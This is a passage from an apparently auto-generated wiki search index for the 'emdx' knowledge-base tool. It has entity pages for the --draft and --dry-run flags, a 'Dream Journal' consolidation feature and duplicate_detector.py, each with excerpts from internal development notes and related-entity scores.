<li><code>source_titles: list[tuple[int, str]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>recent_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>documents_fts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>normalize_tag_to_emoji()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/draft/","title":"--draft","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-15</p>"},{"location":"entities/draft/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...nch<code>| \u2014 | \u2014 | Commit and push to origin branch (implies</code>--worktree<code>, no PR) | |</code>--draft<code>/</code>--no-draft<code>| \u2014 | \u2014 | Create PR as draft (default:</code>--no-draft<code>) | |</code>--worktree<code>|</code>-w<code>| \u2014 | Run in isolated git worktree | |</code>--base-branch<code>|</code>-b` | TEXT | B...</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...ly in <code>--help</code></p> </li> <li>Grouped option panels \u2014 Git/PR options (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are grouped under \"Git &amp; PRs\", and <code>--epic</code>/<code>--cat</code> under \"Organization\"</li> <li> <p>Concise option descriptions \u2014 Trimmed verbose help s...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>...on the Typer app</p> </li> <li>Grouped option panels \u2014 Git/PR flags (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are under \"Git &amp; PRs\"; organization flags (<code>--epic</code>, <code>--cat</code>) are under \"Organization\"</li> <li> <p>Concise help strings \u2014 Every option de...</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p>...\"` on the Typer app</p> </li> <li>Added <code>rich_help_panel=\"Git &amp; PRs\"</code> for <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>Added <code>rich_help_panel=\"Organization\"</code> for <code>--epic</code>, <code>--cat</code></li> <li> <p>Tightened all option help strings to be more concise</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> <p>...options with <code>rich_help_panel</code>**:</p> </li> <li>\"Git &amp; PRs\" panel: <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>\"Organization\" panel: <code>--epic</code>, <code>--cat</code></li> <li> <p>Improved option descriptions \u2014 cleaner, more concise text (e.g. \"Inject documen...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...<code>,</code>--model<code>,</code>--tags<code>,</code>--synthesize<code>,</code>--doc<code>,</code>--epic<code>,</code>--cat<code>,</code>--worktree<code>,</code>--draft<code>,</code>--jobs<code>,</code>--cleanup`, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI. | | 2 | Parallel orchestration (ThreadPoolExecutor) | 639\u2013861 |...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 5. Git Integration</p> <ul> <li><code>--worktree</code>: Isolated execution environment</li> </ul> </li> <li><code>--branch</code>: Push branch without PR (worktree retained)</li> <li><code>--pr</code>: Create PR after changes (worktree cleaned up)</li> <li><code>--draft</code>: Create as draft PR</li> <li> <p><code>--base-branch</code>: Custom base for worktree</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Overview</p> <p>...act`** \u2014 AI-powered document synthesis to reduce KB redundancy</p> </li> <li><code>emdx delegate --draft</code> \u2014 Draft PR mode for review-first workflows  </li> <li> <p><code>SynthesisService</code> \u2014 Shared service for document synthesis operations</p> </li> <li> <p>#6442 Delegate: Fix draft default mismatch in internal functions   Section: Problem</p> <p>...is meant that when calling <code>emdx delegate --pr \"task\"</code> without explicitly passing <code>--draft</code> or <code>--no-draft</code>, the CLI would set <code>draft=False</code> but the internal functions had <code>True</code> as their default, creating potential confusion about which value was actually...</p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Summary</p> <p>Added a new <code>--draft/--no-draft</code> CLI option to <code>emdx delegate --pr</code> that controls whether PRs are created as drafts. The flag defaults to <code>True</code>, meaning PRs are created as drafts by default (safer for automated workflows).</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: Overview</p> <ol> <li><code>emdx compact</code> \u2014 AI-powered document synthesis to reduce redundancy</li> </ol> </li> <li> <p><code>emdx delegate --draft</code> \u2014 Draft PR mode for review-first workflows</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Summary</p> <p>Add <code>--draft</code> flag to <code>emdx delegate</code> that modifies <code>--pr</code> behavior to create draft PRs instead of regular PRs. This enables a review-first workflow where delegate output gets human review before merge.</p> </li> </ul>"},{"location":"entities/draft/#related-entities","title":"Related Entities","text":"<ul> <li><code>gh pr create --draft</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>--no-draft</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>required extras</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>grouped option panels</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx delegate --pr \"task\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx delegate --draft</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>--base-branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.9)</li> <li><code>--branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.8)</li> <li><code>use sonnet</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>_make_pr_instruction()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/dream-journal/","title":"dream journal","text":"<p>Type: concept | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/dream-journal/#documents-16","title":"Documents (16)","text":"<ul> <li>#6474 EMDX Feature Implementation Synthesis   Section: Related Feature Roadmap <p>...ion initialization</p> </li> <li>\ud83d\udd04 Semantic Search Upgrade - Chunk-level retrieval</li> <li> <p>\ud83d\udd04 Dream Journal - Overnight KB consolidation</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: The 7 Features</p> <p>...e \u2014 hybrid + chunk-level search | #6100 | feat/semantic-find | pending | | 5 | Dream Journal \u2014 overnight KB consolidation | #6101 | feat/dream-journal | pending | | 6 | Knowledge Decay** \u2014 spaced resurfacing of stale docs | #6102 | feat/knowledge-decay |...</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: PRIORITY ORDER (for real this time)</p> <p>...effort</p> </li> <li>Semantic find upgrade (#5) \u2014 chunk-level search, medium effort</li> <li>Dream Journal (#3) \u2014 overnight consolidation, medium effort</li> <li>Knowledge Decay (#6) \u2014 spaced resurfacing, low effort</li> <li> <p>Ask the KB (#7) \u2014 RAG Q&amp;A, already partially buil...</p> </li> <li> <p>#6212 Delegate: Sprint PR Fixes [8/8]   Section: PR Status</p> <p>...ug fix | | #448 | Contextual Save | \u2705 PASSING | Cleanup PR #477 created | | #449 | Dream Journal | \u2705 PASSING | Cleanup PR #476 created | | #451 | Knowledge Decay | \u2705 PASSING | Complete | | #453 | Ask the KB | \u2705 PASSING | Complete |</p> </li> <li> <p>#6211 Delegate: bugfix,active [6/8]   Section: Task: Fix Sprint PRs (bugfix,active)</p> </li> <li> <p>#6208 Delegate: Fix PR #449 (Dream Journal): Needs cleanup and tests. Review [3/8]   Section: PR #449 Review: Dream Journal Feature</p> </li> <li> <p>#6207 Delegate: Review PR #449 with 'gh pr view 449' and 'gh pr diff 449'. T   Section: PR #449 Dream Journal Review</p> </li> <li> <p>#6206 Tomorrow's Tasks: Fix Wave for 4 Sprint PRs   Section: Remaining (need fixes + tests):</p> <p>3. PR #449 (Dream Journal)</p> </li> <li>Remove unused 'from ..models.tags import add_tags_to_document' import (line 24)</li> <li> <p>Add tests in tests/test_dream.py: _generate_digest_markdown(), _find_hygiene_issues(), JSON output format</p> </li> <li> <p>#6153 PR Review Sprint: Smart Ops Synthesis   Section: Summary by PR</p> <p>...Contextual Save | \u2705 Approve with changes | Missing tests, unused import | | #449 | Dream Journal | \u2705 Approve with changes | Missing tests | | #451 | Knowledge Decay | \u2705 Approve | Missing tests (minor) | | #452 | Auto-Linking | \u2705 Approve | Missing tests, depth ca...</p> </li> <li> <p>#6148 Delegate: Review PR #449 (Dream Journal). Run: gh pr diff 449. Check c [3/7]</p> </li> </ul>"},{"location":"entities/dream-journal/#summary","title":"Summary","text":"<p>Investigated and tested PR #454 (Semantic Find) and prepared fixes for PR #449 (Dream Journal).</p>"},{"location":"entities/dream-journal/#summary_1","title":"Summary","text":"<p>Reviewed and cleaned up PR #449 which adds the Dream Journal feature for overnight KB consolidation.</p>"},{"location":"entities/dream-journal/#summary_2","title":"Summary","text":"<p>Reviewed and cleaned up the Dream Journal feature from PR #449, adding comprehensive tests.</p>"},{"location":"entities/dream-journal/#pr-449-review-dream-journal-overnight-kb-consolidation","title":"PR #449 Review: Dream Journal \u2014 Overnight KB Consolidation","text":""},{"location":"entities/dream-journal/#summary_3","title":"Summary","text":"<p>PR adds <code>emdx dream</code> command (694 lines) for KB maintenance that detects duplicates, identifies patterns, flags hygiene issues, and generates actionable digests. ## Gameplan Ali...</p> <ul> <li> <p>#6140 Delegate: Read gameplan by running: emdx view 6101. Implement the Drea [5/7]   Section: Dream Journal Implementation Complete</p> </li> <li> <p>#6137 Dream Journal \u2014 February 13, 2026</p> </li> </ul> <p>Processed 67 recent documents. ## \ud83d\udd04 Consolidation</p> <p>\u2728 No duplicate documents found!</p> <ul> <li>#6103 Gameplan #7: Ask the KB (RAG Q&amp;A)   Section: Implementation Steps <p>...mart Priming)**: prime could use ask to generate a session summary</p> </li> <li> <p>Feature #5 (Dream Journal): dream could use ask to detect contradictions</p> </li> <li> <p>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing   Section: Implementation Steps</p> </li> <li>Feature #2 (Auto-Linking): link_count is a strong importance signal</li> <li>Feature #3 (Smart Priming): stale docs appear in prime output</li> <li> <p>Feature #5 (Dream Journal): dream journal includes staleness report</p> </li> <li> <p>#6101 Gameplan #5: Dream Journal (Overnight Consolidation)   Section: User Experience</p> </li> </ul>"},{"location":"entities/dream-journal/#summary_4","title":"Summary","text":"<p>Successfully implemented the Dream Journal feature (overnight KB consolidation) as described in gameplan #6101.</p>"},{"location":"entities/dream-journal/#dream-journal-february-13-2026","title":"\ud83c\udf19 Dream Journal \u2014 February 13, 2026","text":""},{"location":"entities/dream-journal/#synergies","title":"Synergies","text":""},{"location":"entities/dream-journal/#manual-trigger","title":"Manual trigger:","text":"<p>```bash emdx dream</p>"},{"location":"entities/dream-journal/#dream-journal-processing-47-docs","title":"\ud83c\udf19 Dream Journal \u2014 Processing 47 docs...","text":""},{"location":"entities/dream-journal/#_1","title":"dream journal","text":""},{"location":"entities/dream-journal/#consolidation","title":"Consolidation:","text":""},{"location":"entities/dream-journal/#merged-6085-6091-6100-proze-research-results-85-overlap","title":"Merged #6085 + #6091 \u2192 #6100 \"Proze Research &amp; Results\" (85% overlap)","text":""},{"location":"entities/dream-journal/#_2","title":"dream journal","text":""},{"location":"entities/dream-journal/#discovered-patterns","title":"Discovered patterns:","text":""},{"location":"entities/dream-journal/#5-docs-about-au","title":"5 docs about \"au...","text":"<ul> <li>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: RANKING BY IMPACT \u00d7 FEASIBILITY <p>...Smart Priming | \u2605\u2605\u2605\u2605\u2606 | \u2605\u2605\u2605\u2605\u2605 | \ud83e\udd48 | | 3 | Auto-Linking | \u2605\u2605\u2605\u2605\u2606 | \u2605\u2605\u2605\u2605\u2606 | \ud83e\udd48 | | 8 | Dream Journal | \u2605\u2605\u2605\u2605\u2605 | \u2605\u2605\u2605\u2606\u2606 | \ud83e\udd49 | | 1 | emdx diff | \u2605\u2605\u2605\u2606\u2606 | \u2605\u2605\u2605\u2605\u2605 | \u2014 | | 9 | Session Capture | \u2605\u2605\u2605\u2605\u2605 | \u2605\u2605\u2606\u2606\u2606 | \u2014 | | 10 | Adversarial Review | \u2605\u2605\u2605\u2605\u2606 | \u2605\u2605\u2605\u2606\u2606 | \u2014 | | 7 | Version...</p> </li> </ul>"},{"location":"entities/dream-journal/#related-entities","title":"Related Entities","text":"<ul> <li><code>semantic find</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>tests/test_dream.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>from ..models.tags import add_tags_to_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>emdx/commands/dream.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>auto-linking on save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>why it matters for claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>tagpattern</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>synergies</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>spaced resurfacing</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>session design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/dry-run/","title":"--dry-run","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/dry-run/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6761 Obsidian Publish and Wiki Generation UX Research   Section: Directly Applicable to emdx Wiki Generation</p> <p>...| MOC/index pattern | Auto-generated topic index pages | | Preview before apply | <code>--dry-run</code> flag for wikification | | Dataview auto-generated indexes | Query-driven category pages | | Smart exclusions | Skip code blocks, headings, existing links | | IDF we...</p> </li> <li> <p>#6753 Delegate synthesis [synthesis]   Section: Synthesis Complete</p> <p>...tions:**</p> </li> <li>Alias/synonym support for documents would multiply matching recall</li> <li>A <code>--dry-run</code> preview mode aligns with every successful Obsidian workflow (suggest, don't force)</li> <li> <p>Connection density indicators (badge counts) in the TUI \u2014 inspired by the Stran...</p> </li> <li> <p>#6746 Delegate: Research Obsidian community plugins for auto-linking and kno [5/5]   Section: Key Takeaways for emdx Wikification</p> <p>...** \u2014 the most liked plugins suggest links rather than auto-apply them; consider a <code>--dry-run</code> or preview mode</p> </li> <li>Scoping prevents noise \u2014 directory/namespace restrictions prevent irrelevant cross-linking</li> <li> <p>Connection indicators &gt; connection quantity...</p> </li> <li> <p>#6598 Delegate synthesis [synthesis]   Section: 3. Import Command Design</p> <p>MVP scope:</p> </li> </ul> <pre><code>emdx import ./folder           # Bulk import markdown\nemdx import ./vault --obsidian # Obsidian mode with wikilinks\nemdx import ./notes --dry-run  # Preview without saving\n</code></pre> <ul> <li>#6596 Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]   Section: Minimum Viable Command <p>```bash emdx import ./my-notes/             # Import all .md files emdx import ./docs --project \"docs\" # Force project name emdx import ./notes --dry-run       # Preview without saving emdx import ./notes --limit 10      # Test with subset</p> </li> </ul> <pre><code>\n- **#6593** Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]\n  *Section: MVP Import: Plain Markdown Folders*\n  &gt; ### Minimum Viable Command\n```bash\nemdx import ./my-notes/             # Import all .md files\nemdx import ./docs --project \"docs\" # Force project name\nemdx import ./notes --dry-run       # Preview without saving\n</code></pre> <ul> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> <p>Options: <code>--hours N</code>, <code>--dry-run</code>, <code>--json</code>, <code>--quiet</code></p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Usage</p> <p>```bash</p> </li> </ul>"},{"location":"entities/dry-run/#discovery-free-local-tf-idf-only","title":"Discovery (free, local TF-IDF only)","text":"<p>emdx compact --dry-run              # Show clusters of similar docs emdx compact --threshold 0.7        # Adjust similarity threshold</p> <ul> <li>#6452 Implement emdx compact command   Section: Components Created <p>...mpact command (emdx/commands/compact.py)</p> </li> <li>Discovery Mode (free, no API):</li> <li><code>--dry-run</code>: Show clusters using TF-IDF similarity</li> <li><code>--threshold</code>: Adjust similarity threshold (default 0.5)</li> <li> <p><code>--topic</code>: Filter to documents matching topic</p> </li> <li> <p>**Synthes...</p> </li> <li> <p>#6449 Implement emdx compact command   Section: Implementation Complete</p> </li> <li>Discovery mode (<code>--dry-run</code>): Free, local TF-IDF clustering with union-find algorithm</li> <li>Synthesis mode: Claude Opus API for intelligent document merging</li> <li> <p>Archival via tags: Original d...</p> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> <p>...commands/compact.py`)</p> </li> <li>Registered as lazy command in <code>main.py</code></li> <li>Discovery mode (<code>--dry-run</code>): Free, local TF-IDF clustering</li> <li>Synthesis mode: Claude Opus API for intelligent merging</li> <li>Key options:</li> <li> <p><code>--dry-run</code> / <code>-n</code>: Show clusters without API calls   -...</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 1. <code>emdx compact</code> Command</p> <p>...st | | Archive, not delete | Reversible; traceable via <code>superseded-by:ID</code> tag | | <code>--dry-run</code> is free | Users can explore clustering without cost | | Union-find for clustering | O(n\u00b7\u03b1(n)) complexity; handles transitive closure naturally |</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Commands</p> <p>```bash</p> </li> </ul>"},{"location":"entities/dry-run/#key-features","title":"Key Features","text":""},{"location":"entities/dry-run/#discovery-free-instant-local-tf-idf-only","title":"Discovery (free, instant, local TF-IDF only)","text":"<p>emdx compact --dry-run              # Show clusters of similar docs emdx compact --threshold 0.5        # Adjust similarity threshold (default 0.7)</p> <ul> <li>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis <p>Options:</p> </li> <li><code>--dry-run</code>: Show prompt only (don't execute)</li> </ul>"},{"location":"entities/dry-run/#related-entities","title":"Related Entities","text":"<ul> <li><code>superseded-by:id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.9)</li> <li><code>superseded</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.9)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>future extensions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>emdx compact --schedule weekly</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>discovery layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>archive layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>_fetch_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>--obsidian</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>wikilink handling options</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/duplicatedetectorpy/","title":"duplicate_detector.py","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/duplicatedetectorpy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6434 Any/None typing audit [4/5]   Section: Priority Recommendations <p>...<code>health_monitor.py</code> - 2 functions returning <code>dict[str, Any]</code> with known shapes</p> </li> <li><code>duplicate_detector.py</code> - 3 functions with <code>dict[str, Any]</code></li> <li> <p><code>cascade_service.py</code> - <code>get_orphaned_cascade_executions()</code> returns well-defined dict</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/duplicatedetectorpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...rivacy_service.py<code>|</code>compute_draft_score<code>| **NO** | no | *nowhere* | |</code>services/duplicate_detector.py<code>|</code>find_near_duplicates_exact<code>| **NO** | no | *nowhere* | |</code>services/duplicate_detector.py<code>|</code>find_similar_titles<code>| **NO** | no | *nowhere* | |</code>services/embedd...</p> <ul> <li>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: Feature Ideas </li> </ul> <pre><code>emdx save --dedup  # Warns if near-duplicate exists, offers to supersede\n</code></pre> <p>Rationale: Prevents k...</p> <ul> <li>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 2. emdx/services/ (14 files audited) <p>...ocess health data</p> </li> <li><code>health_monitor.py</code>: 2 functions returning health metrics</li> <li><code>duplicate_detector.py</code>: 3 functions with duplicate info</li> <li> <p><code>cascade_service.py</code>: Orphaned execution data</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>...gs) | Service | Lines | Primary Purpose | |---------|-------|-----------------| | <code>duplicate_detector.py:1-504</code> | 504 | Find exact/near duplicates | | <code>document_merger.py:1-503</code> | 503 | Merge similar documents | | <code>similarity.py</code> | (shared) | TF-IDF for both |</p> </li> <li> <p>#6315 Delegate: Analyze CODE COMMENTS &amp; DOCUMENTATION across emdx/ (exclude  [2/15]   Section: \u2705 STRENGTHS</p> <p>...* Most modules have clear, descriptive docstrings explaining purpose and usage:</p> </li> <li><code>duplicate_detector.py</code>: Documents MinHash/LSH algorithm choice and O(n) vs O(n\u00b2) tradeoff</li> <li><code>claude_executor.py</code>: Explains stream-json default, module purpose, dependency architecture</li> <li> <p>`...</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 6. Service Interface Analysis</p> <p>Services with cleanup potential:</p> </li> <li><code>cascade_service.py</code> - unused, logic moved to commands</li> <li><code>health_monitor.py</code> - overlaps with <code>execution_monitor.py</code></li> <li> <p><code>duplicate_detector.py</code> - replaced by <code>similarity.py</code></p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]   Section: Well-Designed Patterns Found \u2713</p> <p>...Graceful degradation - Services like <code>similarity.py</code>, <code>embedding_service.py</code>, <code>duplicate_detector.py</code> all use <code>try/except ImportError</code> with <code>HAS_*</code> flags</p> </li> <li>Grouped extras - <code>[ai]</code>, <code>[similarity]</code>, <code>[google]</code>, <code>[all]</code> extras are well-organized</li> <li> <p>**Version flexi...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...- log_stream.py: All 1 necessary</p> </li> <li>health_monitor.py: All 2 necessary</li> <li>duplicate_detector.py: All 2 necessary</li> <li>cascade_service.py: All 2 necessary</li> <li>file_watcher.py: All 1 necessary</li> <li> <p>execution_service.py: All 1 necessary</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: TRULY UNNECESSARY <code>| None</code> Annotations Found</p> </li> </ul> <pre><code>max_documents: int | None = None,\n</code></pre> <p>Verdict: NECESSARY \u2014 <code>if max_documents:</code> check in code.</p>"},{"location":"entities/duplicatedetectorpy/#c-smart-deduplication-on-save","title":"C. Smart Deduplication on Save","text":"<p>The <code>duplicate_detector.py</code> service exists but isn't integrated into <code>save</code>. Add:</p>"},{"location":"entities/duplicatedetectorpy/#3-duplicate_detectorpy163-max_documents","title":"3. <code>duplicate_detector.py:163</code> \u2014 <code>max_documents</code>","text":""},{"location":"entities/duplicatedetectorpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>find_all_duplicate_pairs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>cli_executor/cursor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>calculate_overall_health()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>execution_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>health_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.8)</li> <li><code>embedding_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.8)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 